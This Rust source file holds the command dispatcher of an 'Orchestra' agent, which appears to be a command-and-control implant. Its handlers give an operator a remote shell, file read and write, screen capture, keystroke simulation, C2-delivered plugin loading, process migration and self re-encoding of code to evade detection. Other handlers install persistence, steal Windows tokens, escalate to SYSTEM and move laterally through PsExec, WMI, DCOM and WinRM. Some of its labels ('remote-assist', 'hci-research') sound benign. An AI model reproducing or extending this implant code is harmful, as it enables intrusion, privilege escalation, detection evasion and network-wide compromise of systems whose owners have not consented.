//! Command dispatch and handler registry for the Orchestra agent.
//!
//! This module implements the central command-processing loop. Each variant of
//! [`Command`] is dispatched to the appropriate handler function. It also
//! manages shared mutable state for long-running operations:
//!
//! - **Pending module requests**: Tracks in-flight plugin load operations.
//! - **Shell sessions**: Manages interactive shell session lifetimes.
//! - **Loaded plugins**: Registry of dynamically loaded plugin modules.

use base64::Engine;
use common::{config::Config, AuditEvent, Command, CryptoSession, Message, Outcome};
use lazy_static::lazy_static;
use module_loader::LoadedPlugin;
use std::collections::HashMap;
use std::path::Path;
use std::sync::{Arc, Mutex};
use sysinfo::System;
use tokio::sync::Mutex as TokioMutex;
use uuid::Uuid;

use super::{fsops, shell};

// Pending module-download requests.  When the `DownloadModule` handler
// sends a `ModuleRequest` through the C2 channel, it inserts a oneshot
// sender keyed by `module_id`.  When the corresponding `ModuleResponse`
// arrives in the main loop, the oneshot is completed with the encrypted
// blob, unblocking the handler.
lazy_static! {
    pub static ref PENDING_MODULE_REQUESTS: Mutex<HashMap<String, tokio::sync::oneshot::Sender<Vec<u8>>>> =
        Mutex::new(HashMap::new());
}

/// Reject any module identifier that contains characters outside the
/// safe alphabet. Prevents path traversal via the `DeployModule`
/// command (e.g. `../../etc/passwd`).
pub(crate) fn is_valid_module_id(id: &str) -> bool {
    !id.is_empty()
        && id.len() <= 128
        && id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

/// Tracks the state of an asynchronous plugin job.
struct PluginJob {
    /// The plugin that owns this job.
    plugin_id: String,
    /// Current status of the job.
    status: String, // "running", "completed", "failed"
    /// Output data, if available.
    output: Option<String>,
}

lazy_static! {
    static ref SHELL_SESSIONS: Mutex<HashMap<String, Arc<Mutex<shell::ShellSession>>>> =
        Mutex::new(HashMap::new());
    static ref LOADED_PLUGINS: Mutex<HashMap<String, LoadedPlugin>> =
        Mutex::new(HashMap::new());
    pub static ref SHUTDOWN_NOTIFY: Arc<tokio::sync::Notify> = Arc::new(tokio::sync::Notify::new());
    /// Registry of asynchronous plugin jobs keyed by job ID.
    static ref PLUGIN_JOBS: Mutex<HashMap<String, PluginJob>> =
        Mutex::new(HashMap::new());
}

fn sanitize_action(cmd: &Command) -> String {
    match cmd {
        Command::WriteFile { path, .. } => format!("WriteFile(path={path:?})"),
        Command::ShellInput { session_id, .. } => format!("ShellInput(session={session_id})"),
        Command::ReadFile { path } => format!("ReadFile(path={path:?})"),
        other => format!("{other:?}"),
    }
}

/// Sanitize the result string before it appears in the audit log.
///
/// Successful `ReadFile`, `ShellOutput`, and `CaptureScreen` results contain
/// base64-encoded file/shell/screen data.  Logging that verbatim would write
/// potentially sensitive content to the audit trail (contradicting the claim
/// in `SECURITY_AUDIT.md §8`).  Replace those payloads with a size summary.
fn sanitize_result(cmd: &Command, result: &Result<String, String>) -> String {
    match (cmd, result) {
        (Command::ReadFile { .. }, Ok(b64)) => {
            format!("[file content redacted, {} base64 bytes]", b64.len())
        }
        (Command::ShellOutput { .. }, Ok(b64)) => {
            format!("[shell output redacted, {} base64 bytes]", b64.len())
        }
        (Command::CaptureScreen, Ok(b64)) => {
            format!("[screenshot redacted, {} base64 bytes]", b64.len())
        }
        (_, Ok(s)) => s.clone(),
        (_, Err(e)) => e.clone(),
    }
}

pub(crate) fn make_audit(
    action: &str,
    outcome: Outcome,
    details: &str,
    operator_id: &str,
) -> AuditEvent {
    let agent_id = System::host_name().unwrap_or_else(|| "unknown".to_string());
    AuditEvent::new(&agent_id, operator_id, action, details, outcome)
}

/// Handle a server-initiated module push: decrypt, verify signature (when the
/// `module-signatures` feature is active), and register the loaded plugin.
///
/// The module name must pass the same validation applied to `DeployModule` to
/// prevent a malicious server from injecting arbitrary plugin IDs.
pub(crate) fn push_module(
    module_name: String,
    encrypted_blob: &[u8],
    crypto: &CryptoSession,
    verify_key: Option<&str>,
) -> Result<String, String> {
    if !is_valid_module_id(&module_name) {
        return Err(format!(
            "ModulePush rejected: invalid module_name '{}' (allowed: [a-zA-Z0-9_-]{{1,128}})",
            module_name
        ));
    }
    match module_loader::load_plugin(encrypted_blob, crypto, verify_key) {
        Ok(plugin) => {
            let metadata = plugin
                .get_metadata()
                .unwrap_or_else(|| module_loader::PluginMetadata::default_for(&module_name));
            let load_timestamp = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs();
            LOADED_PLUGINS
                .lock()
                .unwrap()
                .insert(
                    module_name.clone(),
                    LoadedPlugin {
                        plugin: Arc::new(plugin),
                        metadata,
                        load_timestamp,
                    },
                );
            Ok(format!("Module '{}' loaded via push", module_name))
        }
        Err(e) => Err(e.to_string()),
    }
}

pub async fn handle_command(
    crypto: Arc<CryptoSession>,
    config: Arc<TokioMutex<Config>>,
    command: Command,
    operator_id: &str,
    out_tx: tokio::sync::mpsc::Sender<Message>,
    p2p_mesh: Arc<tokio::sync::Mutex<crate::p2p::P2pMesh>>,
) -> (Result<String, String>, Option<Vec<u8>>, AuditEvent) {
    let action = sanitize_action(&command);

    let mut result_data: Option<Vec<u8>> = None;
    let result: Result<String, String> = match command {
        Command::Ping => Ok("pong".to_string()),
        Command::GetSystemInfo => handle_system_info(),
        Command::RunApprovedScript { ref script } => handle_run_approved_script(script),

        Command::ListDirectory { ref path } => {
            let cfg = config.lock().await.clone();
            match fsops::list_directory(path, &cfg).await {
                Ok(entries) => Ok(serde_json::to_string(&entries).unwrap_or_default()),
                Err(e) => Err(e.to_string()),
            }
        }

        Command::ReadFile { ref path } => {
            let cfg = config.lock().await.clone();
            match fsops::read_file(path, &cfg).await {
                Ok(content) => Ok(base64::engine::general_purpose::STANDARD.encode(&content)),
                Err(e) => Err(e.to_string()),
            }
        }

        Command::WriteFile {
            ref path,
            ref content,
        } => {
            let cfg = config.lock().await.clone();
            match fsops::write_file(path, content, &cfg).await {
                Ok(_) => Ok("success".to_string()),
                Err(e) => Err(e.to_string()),
            }
        }

        Command::StartShell => {
            let session_id = Uuid::new_v4().to_string();
            match shell::ShellSession::new() {
                Ok(session) => {
                    SHELL_SESSIONS
                        .lock()
                        .unwrap()
                        .insert(session_id.clone(), Arc::new(Mutex::new(session)));
                    Ok(session_id)
                }
                Err(e) => Err(e.to_string()),
            }
        }

        Command::ShellInput {
            ref session_id,
            ref data,
        } => {
            let sessions = SHELL_SESSIONS.lock().unwrap();
            if let Some(session) = sessions.get(session_id) {
                let mut sess = session.lock().unwrap();
                match sess.write_input(data) {
                    Ok(_) => Ok(String::new()),
                    Err(e) => Err(e.to_string()),
                }
            } else {
                Err("Shell session not found".to_string())
            }
        }

        Command::ShellOutput { ref session_id } => {
            let sessions = SHELL_SESSIONS.lock().unwrap();
            if let Some(session) = sessions.get(session_id) {
                let mut sess = session.lock().unwrap();
                let output = sess.try_read_output();
                Ok(base64::engine::general_purpose::STANDARD.encode(&output))
            } else {
                Err("Shell session not found".to_string())
            }
        }

        Command::CloseShell { ref session_id } => {
            let removed = SHELL_SESSIONS.lock().unwrap().remove(session_id);
            // Dropping the Arc (and thus ShellSession) kills the child process
            // and frees the PTY file descriptors via ShellSession::drop().
            drop(removed);
            Ok("Shell session closed".to_string())
        }

        #[cfg(feature = "network-discovery")]
        Command::DiscoverNetwork => {
            let cfg = config.lock().await.clone();
            let hosts = super::net_discovery::arp_scan().unwrap_or_default();
            // `arp_scan` reads the local ARP cache — it shows hosts this
            // machine has recently communicated with.  For a proactive sweep
            // of a subnet, use `ping_sweep` with an explicit CIDR configured
            // via `port_scan_concurrency` / `port_scan_timeout_ms` in agent.toml.
            Ok(serde_json::json!({
                "arp_hosts": hosts,
                "scan_config": {
                    "concurrency": cfg.port_scan_concurrency,
                    "timeout_ms": cfg.port_scan_timeout_ms,
                },
                "note": "arp_hosts reflects the local ARP cache only; \
                         to probe a subnet proactively use the PortScan handler."
            })
            .to_string())
        }
        #[cfg(not(feature = "network-discovery"))]
        Command::DiscoverNetwork => Err("network-discovery feature not enabled".to_string()),

        #[cfg(feature = "remote-assist")]
        Command::CaptureScreen => match super::remote_assist::capture_screen() {
            Ok(data) => Ok(base64::engine::general_purpose::STANDARD.encode(&data)),
            Err(e) => Err(e.to_string()),
        },
        #[cfg(not(feature = "remote-assist"))]
        Command::CaptureScreen => Err("remote-assist feature not enabled".to_string()),

        #[cfg(feature = "remote-assist")]
        Command::SimulateKey { ref key } => super::remote_assist::simulate_key(key)
            .map(|_| "success".to_string())
            .map_err(|e| e.to_string()),
        #[cfg(not(feature = "remote-assist"))]
        Command::SimulateKey { .. } => Err("remote-assist feature not enabled".to_string()),

        #[cfg(feature = "remote-assist")]
        Command::SimulateMouse { x, y } => super::remote_assist::simulate_mouse_move(x, y)
            .map(|_| "success".to_string())
            .map_err(|e| e.to_string()),
        #[cfg(not(feature = "remote-assist"))]
        Command::SimulateMouse { .. } => Err("remote-assist feature not enabled".to_string()),

        #[cfg(feature = "hci-research")]
        Command::StartHciLogging => {
            super::hci_logging::start_logging().map(|_| "success".to_string())
        }
        #[cfg(not(feature = "hci-research"))]
        Command::StartHciLogging => Err("hci-research feature not enabled".to_string()),

        #[cfg(feature = "hci-research")]
        Command::StopHciLogging => {
            super::hci_logging::stop_logging().map(|_| "success".to_string())
        }
        #[cfg(not(feature = "hci-research"))]
        Command::StopHciLogging => Err("hci-research feature not enabled".to_string()),

        #[cfg(feature = "hci-research")]
        Command::GetHciLogBuffer => match super::hci_logging::get_log_buffer() {
            Ok(buffer) => serde_json::to_string(&buffer).map_err(|e| e.to_string()),
            Err(e) => Err(e),
        },
        #[cfg(not(feature = "hci-research"))]
        Command::GetHciLogBuffer => Err("hci-research feature not enabled".to_string()),

        Command::DeployModule { ref module_id } => {
            if !is_valid_module_id(module_id) {
                Err("Invalid module_id (allowed: [a-zA-Z0-9_-]{1,128})".to_string())
            } else {
                let cfg = config.lock().await.clone();
                let path = Path::new(&cfg.module_cache_dir).join(format!(
                    "{}.{}",
                    module_id,
                    std::env::consts::DLL_EXTENSION
                ));
                let path_str = path.to_string_lossy().into_owned();
                match fsops::read_file(&path_str, &cfg).await {
                    Err(e) => Err(format!("Failed to read module blob: {e}")),
                    Ok(blob) => match module_loader::load_plugin(&blob, &crypto, cfg.module_verify_key.as_deref()) {
                        Ok(plugin) => {
                            let metadata = plugin
                                .get_metadata()
                                .unwrap_or_else(|| module_loader::PluginMetadata::default_for(module_id));
                            let load_timestamp = std::time::SystemTime::now()
                                .duration_since(std::time::UNIX_EPOCH)
                                .unwrap_or_default()
                                .as_secs();
                            LOADED_PLUGINS
                                .lock()
                                .unwrap()
                                .insert(
                                    module_id.clone(),
                                    LoadedPlugin {
                                        plugin: Arc::new(plugin),
                                        metadata,
                                        load_timestamp,
                                    },
                                );
                            Ok("Module deployed".to_string())
                        }
                        Err(e) => Err(e.to_string()),
                    },
                }
            }
        }

        Command::ExecutePlugin {
            ref plugin_id,
            ref args,
        } => {
            // Clone the Arc while holding the lock, then release the lock
            // before calling execute() so other plugin operations are not
            // serialised behind a long-running plugin execution.
            let maybe_plugin = {
                let plugins = LOADED_PLUGINS.lock().unwrap();
                plugins.get(plugin_id).map(|lp| lp.plugin.clone())
            };
            match maybe_plugin {
                Some(plugin) => match (**plugin).execute(args) {
                    Ok(result) => {
                        // Check for async job marker.
                        if let Some(rest) = result.strip_prefix("__ASYNC_JOB__:") {
                            let job_id = rest.to_string();
                            PLUGIN_JOBS.lock().unwrap().insert(
                                job_id.clone(),
                                PluginJob {
                                    plugin_id: plugin_id.clone(),
                                    status: "running".to_string(),
                                    output: None,
                                },
                            );
                            Ok(format!("Job started: {job_id}"))
                        } else {
                            Ok(result)
                        }
                    }
                    Err(e) => Err(e.to_string()),
                },
                None => Err(format!("Plugin '{plugin_id}' not loaded")),
            }
        }

        Command::ReloadConfig => match crate::config::load_config() {
            Ok(new_cfg) => {
                let mut cfg = config.lock().await;
                *cfg = new_cfg;
                Ok("Configuration reloaded".to_string())
            }
            Err(e) => Err(e.to_string()),
        },

        Command::ListProcesses => {
            let procs = crate::process_manager::list_processes();
            serde_json::to_string(&procs).map_err(|e| e.to_string())
        }

        Command::MigrateAgent { target_pid } => {
            crate::process_manager::migrate_to_process(target_pid)
                .map(|_| "Migration completed".to_string())
                .map_err(|e| e.to_string())
        }

        #[cfg(feature = "self-reencode")]
        Command::SetReencodeSeed { seed } => {
            crate::self_reencode::set_seed(seed);
            log::info!("self-reencode seed updated to {seed:#018x}");
            Ok(format!("Re-encode seed set to {seed:#018x}"))
        }
        #[cfg(not(feature = "self-reencode"))]
        Command::SetReencodeSeed { .. } => {
            Err("self-reencode feature not enabled".to_string())
        }

        /// MorphNow: immediately re-encode .text with the supplied seed and
        /// return the SHA-256 hash of the resulting .text section.
        #[cfg(feature = "self-reencode")]
        Command::MorphNow { seed } => {
            match crate::self_reencode::morph_now(seed) {
                Ok(hash) => {
                    log::info!("MorphNow completed: .text hash = {hash}");
                    Ok(hash)
                }
                Err(e) => {
                    log::error!("MorphNow failed: {e:#}");
                    Err(format!("MorphNow failed: {e:#}"))
                }
            }
        }
        #[cfg(not(feature = "self-reencode"))]
        Command::MorphNow { .. } => {
            Err("self-reencode feature not enabled".to_string())
        }

        #[cfg(feature = "persistence")]
        Command::EnablePersistence => crate::persistence::install_persistence()
            .map(|p| format!("Persistence installed at {}", p.display()))
            .map_err(|e| e.to_string()),
        #[cfg(not(feature = "persistence"))]
        Command::EnablePersistence => Err("persistence feature not enabled".to_string()),

        #[cfg(feature = "persistence")]
        Command::DisablePersistence => crate::persistence::uninstall_persistence()
            .map(|_| "Persistence removed".to_string())
            .map_err(|e| e.to_string()),
        #[cfg(not(feature = "persistence"))]
        Command::DisablePersistence => Err("persistence feature not enabled".to_string()),

        // ── Plugin Framework commands ──

        Command::ListPlugins => {
            let plugins = LOADED_PLUGINS.lock().unwrap();
            let meta_list: Vec<_> = plugins.values().map(|lp| &lp.metadata).collect();
            serde_json::to_string(&meta_list).map_err(|e| e.to_string())
        }

        Command::UnloadPlugin { ref plugin_id } => {
            let removed = LOADED_PLUGINS.lock().unwrap().remove(plugin_id);
            // Dropping the LoadedPlugin drops the inner Arc<Box<dyn Plugin>>,
            // which triggers destroy via the FfiPlugin Drop implementation.
            if removed.is_some() {
                Ok(format!("Plugin '{plugin_id}' unloaded"))
            } else {
                Err(format!("Plugin '{plugin_id}' not loaded"))
            }
        }

        Command::GetPluginInfo { ref plugin_id } => {
            let plugins = LOADED_PLUGINS.lock().unwrap();
            match plugins.get(plugin_id) {
                Some(lp) => {
                    serde_json::to_string(&lp.metadata).map_err(|e| e.to_string())
                }
                None => Err(format!("Plugin '{plugin_id}' not loaded")),
            }
        }

        Command::DownloadModule {
            ref module_id,
            ref repo_url,
        } => {
            if !is_valid_module_id(module_id) {
                Err("Invalid module_id (allowed: [a-zA-Z0-9_-]{1,128})".to_string())
            } else {
                let _ = repo_url; // URL no longer used — module goes through C2.

                // ── C2-tunneled module download ──────────────────────
                // Send a ModuleRequest through the outbound C2 channel
                // and wait for the server's ModuleResponse via a oneshot.
                let (tx, rx) = tokio::sync::oneshot::channel::<Vec<u8>>();
                {
                    let mut pending = PENDING_MODULE_REQUESTS.lock().unwrap();
                    pending.insert(module_id.clone(), tx);
                }

                let req = Message::ModuleRequest {
                    module_id: module_id.clone(),
                };
                if let Err(e) = out_tx.send(req).await {
                    // Remove the pending entry since the request never went out.
                    PENDING_MODULE_REQUESTS.lock().unwrap().remove(module_id);
                    return (
                        Err(format!("Failed to send ModuleRequest: {e}")),
                        None,
                        make_audit(&action, Outcome::Failure, &e.to_string(), operator_id),
                    );
                }

                // Wait for the server's ModuleResponse.  The main loop
                // completes the oneshot when it receives the response.
                match rx.await {
                    Ok(encrypted_blob) => {
                        if encrypted_blob.is_empty() {
                            return (
                                Err(format!("Module '{module_id}' not found on server")),
                                None,
                                make_audit(
                                    &action,
                                    Outcome::Failure,
                                    "server returned empty module",
                                    operator_id,
                                ),
                            );
                        }

                        // Feed the encrypted blob directly into load_plugin
                        // (no intermediate file on disk).
                        let cfg = config.lock().await.clone();
                        match module_loader::load_plugin(
                            &encrypted_blob,
                            &crypto,
                            cfg.module_verify_key.as_deref(),
                        ) {
                            Ok(plugin) => {
                                let metadata = plugin.get_metadata().unwrap_or_else(|| {
                                    module_loader::PluginMetadata::default_for(module_id)
                                });
                                let load_timestamp = std::time::SystemTime::now()
                                    .duration_since(std::time::UNIX_EPOCH)
                                    .unwrap_or_default()
                                    .as_secs();
                                LOADED_PLUGINS.lock().unwrap().insert(
                                    module_id.clone(),
                                    LoadedPlugin {
                                        plugin: Arc::new(plugin),
                                        metadata,
                                        load_timestamp,
                                    },
                                );
                                Ok(format!("Module '{module_id}' downloaded and loaded via C2"))
                            }
                            Err(e) => Err(format!("Module load failed: {e}")),
                        }
                    }
                    Err(_) => {
                        Err(format!("ModuleRequest for '{module_id}' cancelled — channel closed"))
                    }
                }
            }
        }

        Command::ExecutePluginBinary {
            ref plugin_id,
            ref input_data,
        } => {
            let maybe_plugin = {
                let plugins = LOADED_PLUGINS.lock().unwrap();
                plugins.get(plugin_id).map(|lp| lp.plugin.clone())
            };
            match maybe_plugin {
                Some(plugin) => {
                    match (**plugin).execute_binary(input_data) {
                        Ok(output) => {
                            let len = output.len();
                            result_data = Some(output);
                            Ok(format!("Binary result: {} bytes", len))
                        }
                        Err(e) => Err(e.to_string()),
                    }
                }
                None => Err(format!("Plugin '{plugin_id}' not loaded")),
            }
        }

        Command::JobStatus { ref job_id } => {
            let jobs = PLUGIN_JOBS.lock().unwrap();
            match jobs.get(job_id) {
                Some(job) => {
                    let info = serde_json::json!({
                        "job_id": job_id,
                        "plugin_id": job.plugin_id,
                        "status": job.status,
                        "output": job.output,
                    });
                    Ok(info.to_string())
                }
                None => Err(format!("Job '{job_id}' not found")),
            }
        }

        Command::Shutdown => {
            SHUTDOWN_NOTIFY.notify_one();
            Ok("Agent shutdown sequence initiated".to_string())
        }

        // ── Token Manipulation (Windows only) ─────────────────────────

        #[cfg(windows)]
        Command::MakeToken { ref username, ref password, ref domain, logon_type } => {
            super::token_manipulation::make_token(username, password, domain, logon_type)
                .map_err(|e| e.to_string())
        }
        #[cfg(not(windows))]
        Command::MakeToken { .. } => Err("token manipulation requires Windows".to_string()),

        #[cfg(windows)]
        Command::StealToken { target_pid } => {
            super::token_manipulation::steal_token(target_pid)
                .map_err(|e| e.to_string())
        }
        #[cfg(not(windows))]
        Command::StealToken { .. } => Err("token manipulation requires Windows".to_string()),

        #[cfg(windows)]
        Command::Rev2Self => {
            super::token_manipulation::rev2self()
                .map_err(|e| e.to_string())
        }
        #[cfg(not(windows))]
        Command::Rev2Self => Err("token manipulation requires Windows".to_string()),

        #[cfg(windows)]
        Command::GetSystem => {
            super::token_manipulation::get_system()
                .map_err(|e| e.to_string())
        }
        #[cfg(not(windows))]
        Command::GetSystem => Err("token manipulation requires Windows".to_string()),

        // ── Lateral Movement (Windows only) ───────────────────────────

        #[cfg(windows)]
        Command::PsExec { ref target_host, ref command, ref username, ref password } => {
            let user = username.as_deref();
            let pass = password.as_deref();
            super::lateral_movement::psexec_exec(target_host, command, user, pass)
                .map_err(|e| e.to_string())
        }
        #[cfg(not(windows))]
        Command::PsExec { .. } => Err("lateral movement requires Windows".to_string()),

        #[cfg(windows)]
        Command::WmiExec { ref target_host, ref command, ref username, ref password } => {
            let user = username.as_deref();
            let pass = password.as_deref();
            super::lateral_movement::wmi_exec(target_host, command, user, pass)
                .map_err(|e| e.to_string())
        }
        #[cfg(not(windows))]
        Command::WmiExec { .. } => Err("lateral movement requires Windows".to_string()),

        #[cfg(windows)]
        Command::DcomExec { ref target_host, ref command, ref username, ref password } => {
            let user = username.as_deref();
            let pass = password.as_deref();
            super::lateral_movement::dcom_exec(target_host, command, user, pass)
                .map_err(|e| e.to_string())
        }
        #[cfg(not(windows))]
        Command::DcomExec { .. } => Err("lateral movement requires Windows".to_string()),

        #[cfg(windows)]
        Command::WinRmExec { ref target_host, ref command, ref username, ref password } => {
            let user = username.as_deref();
            let pass = password.as_deref();
            super::lateral_movement::winrm_exec(target_host, command, user, pass).await
                .map_err(|e| e.to_string())
        }
        #[cfg(not(windows))]
        Command::WinRmExec { .. } => Err("lateral movement requires Windows".to_string()),

        // ── P2P mesh management ────────────────────────────────────────
        Command::LinkAgents { .. } => Err("P2P LinkAgents not yet implemented on agent".to_string()),
        Command::UnlinkAgent { .. } => Err("P2P UnlinkAgent not yet implemented on agent".to_string()),
        Command::ListTopology => Err("P2P ListTopology not yet implemented on agent".to_string()),

        // ── Agent-side P2P link commands ───────────────────────────────
        Command::LinkTo { ref parent_addr, ref transport } => {
            let mesh_arc = p2p_mesh.clone();
            let mut mesh_guard = mesh_arc.lock().await;
            match mesh_guard.connect_to_parent(
                parent_addr,
                transport,
                out_tx.clone(),
                p2p_mesh.clone(),
            ).await {
                Ok(link_id) => Ok(format!(
                    "connected to parent at {} via {}, link_id={:#010X}",
                    parent_addr, transport, link_id
                )),
                Err(e) => Err(format!("LinkTo failed: {e}")),
            }
        }
        Command::Unlink { ref link_id } => {
            let mut mesh_guard = p2p_mesh.lock().await;
            match mesh_guard.disconnect(*link_id).await {
                0 => Err("no links to disconnect".to_string()),
                n => Ok(format!("disconnected {n} link(s)")),
            }
        }
        Command::ListLinks => {
            let mesh_guard = p2p_mesh.lock().await;
            let links = mesh_guard.list_links();
            Ok(serde_json::to_string(&links).unwrap_or_else(|_| "[]".to_string()))
        }
    };

    let (outcome, details) = match &result {
        Ok(_) => (Outcome::Success, sanitize_result(&command, &result)),
        Err(e) => (Outcome::Failure, e.clone()),
    };
    let audit = make_audit(&action, outcome, &details, operator_id);
    (result, result_data, audit)
}

fn handle_system_info() -> Result<String, String> {
    let mut sys = System::new_all();
    sys.refresh_all();
    let info = serde_json::json!({
        "os": System::name(),
        "hostname": System::host_name(),
        "cpu_count": sys.cpus().len(),
        "memory": { "total_bytes": sys.total_memory(), "used_bytes": sys.used_memory() },
        "process_count": sys.processes().len(),
    });
    Ok(info.to_string())
}

fn handle_run_approved_script(name: &str) -> Result<String, String> {
    match name {
        "health_check" => Ok("Health check OK".to_string()),
        other => Err(format!("'{other}' is not an approved script")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn module_id_validation_accepts_safe_names() {
        assert!(is_valid_module_id("hello_plugin"));
        assert!(is_valid_module_id("net-scan-v2"));
        assert!(is_valid_module_id("ABC123"));
    }

    #[test]
    fn module_id_validation_rejects_traversal_and_path_chars() {
        assert!(!is_valid_module_id("../../etc/passwd"));
        assert!(!is_valid_module_id("foo/bar"));
        assert!(!is_valid_module_id("foo.bar"));
        assert!(!is_valid_module_id(""));
        assert!(!is_valid_module_id("foo bar"));
    }

    #[tokio::test]
    async fn deploy_module_rejects_traversal_id() {
        let cfg = Config::default();
        let crypto = Arc::new(CryptoSession::from_key([0u8; 32]));
        let cfg_arc = Arc::new(TokioMutex::new(cfg));
        let (res, _, audit) = handle_command(
            crypto,
            cfg_arc,
            Command::DeployModule {
                module_id: "../../etc/passwd".into(),
            },
            "admin",
        )
        .await;
        assert!(res.is_err(), "expected rejection, got {res:?}");
        assert!(matches!(audit.outcome, Outcome::Failure));
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn deploy_module_reads_from_configured_cache_dir() {
        // Stage a fake (and intentionally invalid as a real plugin) blob in
        // a writable cache dir, then verify the handler reaches the
        // module_loader stage rather than failing at path validation.
        let cache = tempfile::tempdir().unwrap();
        let blob_path = cache
            .path()
            .join(format!("test_mod.{}", std::env::consts::DLL_EXTENSION));
        std::fs::write(&blob_path, b"not-a-real-plugin").unwrap();

        let cfg = Config {
            allowed_paths: vec![cache.path().to_string_lossy().into_owned()],
            module_cache_dir: cache.path().to_string_lossy().into_owned(),
            ..Config::default()
        };
        let crypto = Arc::new(CryptoSession::from_key([0u8; 32]));
        let cfg_arc = Arc::new(TokioMutex::new(cfg));

        let (res, _, _audit) = handle_command(
            crypto,
            cfg_arc,
            Command::DeployModule {
                module_id: "test_mod".into(),
            },
            "admin",
        )
        .await;

        // Path validation must pass; the loader will reject the bogus blob.
        // What matters is that the failure is NOT a "Failed to read module
        // blob" / policy error.
        match res {
            Ok(_) => {} // unlikely with junk bytes, but acceptable
            Err(e) => {
                assert!(
                    !e.contains("Failed to read module blob"),
                    "validation should have allowed the read: {e}"
                );
                assert!(
                    !e.contains("Path is outside"),
                    "module_cache_dir should be allowed: {e}"
                );
            }
        }
    }

    // ── SECURITY_AUDIT.md §8 compliance tests ────────────────────────────────

    /// AuditEvent.details must NOT contain base64-encoded file contents for a
    /// successful ReadFile command.
    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn audit_event_does_not_contain_file_contents() {
        let dir = tempfile::tempdir().unwrap();
        let secret_file = dir.path().join("secret.txt");
        let secret = b"super-secret-password-data";
        std::fs::write(&secret_file, secret).unwrap();

        let cfg = Config {
            allowed_paths: vec![dir.path().to_string_lossy().into_owned()],
            ..Config::default()
        };
        let crypto = Arc::new(CryptoSession::from_key([0u8; 32]));
        let (res, _result_data, audit) = handle_command(
            crypto,
            Arc::new(TokioMutex::new(cfg)),
            Command::ReadFile {
                path: secret_file.to_string_lossy().into_owned(),
            },
            "admin",
        )
        .await;

        // The command must succeed.
        assert!(res.is_ok(), "ReadFile should succeed: {res:?}");

        // The audit details must NOT contain the file content (raw or base64).
        let b64_content = base64::engine::general_purpose::STANDARD.encode(secret);
        assert!(
            !audit.details.contains(&b64_content),
            "audit.details must not contain base64 file contents"
        );
        assert!(
            !audit.details.contains("super-secret"),
            "audit.details must not contain plaintext file contents"
        );
        // The redacted marker must be present.
        assert!(
            audit.details.contains("redacted"),
            "audit.details should contain redaction marker, got: {:?}",
            audit.details
        );
    }

    /// AuditEvent.details must NOT contain shell output for a ShellOutput result.
    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn shell_io_is_redacted_in_audit() {
        // Start a shell, send a command, read output.
        let crypto = Arc::new(CryptoSession::from_key([0u8; 32]));
        let cfg_arc = Arc::new(TokioMutex::new(Config::default()));

        let (start_res, _, _) = handle_command(
            crypto.clone(),
            cfg_arc.clone(),
            Command::StartShell,
            "admin",
        )
        .await;
        let session_id = start_res.expect("StartShell should succeed");

        // Send a command that produces predictable output.
        handle_command(
            crypto.clone(),
            cfg_arc.clone(),
            Command::ShellInput {
                session_id: session_id.clone(),
                data: b"echo ORCHESTRA_TEST_SENTINEL\n".to_vec(),
            },
            "admin",
        )
        .await;

        // Give the shell a moment to produce output.
        tokio::time::sleep(std::time::Duration::from_millis(50)).await;

        let (out_res, _, audit) = handle_command(
            crypto.clone(),
            cfg_arc.clone(),
            Command::ShellOutput {
                session_id: session_id.clone(),
            },
            "admin",
        )
        .await;
        assert!(out_res.is_ok(), "ShellOutput should succeed");

        // The raw sentinel text must not appear in the audit log.
        assert!(
            !audit.details.contains("ORCHESTRA_TEST_SENTINEL"),
            "audit.details must not contain raw shell output"
        );
        // The base64-encoded output must also be absent.
        if let Ok(ref b64) = out_res {
            assert!(
                !audit.details.contains(b64.as_str()),
                "audit.details must not contain base64 shell output"
            );
        }
        assert!(
            audit.details.contains("redacted"),
            "audit.details should contain redaction marker, got: {:?}",
            audit.details
        );

        // Clean up.
        handle_command(
            crypto,
            cfg_arc,
            Command::CloseShell { session_id },
            "admin",
        )
        .await;
    }
}
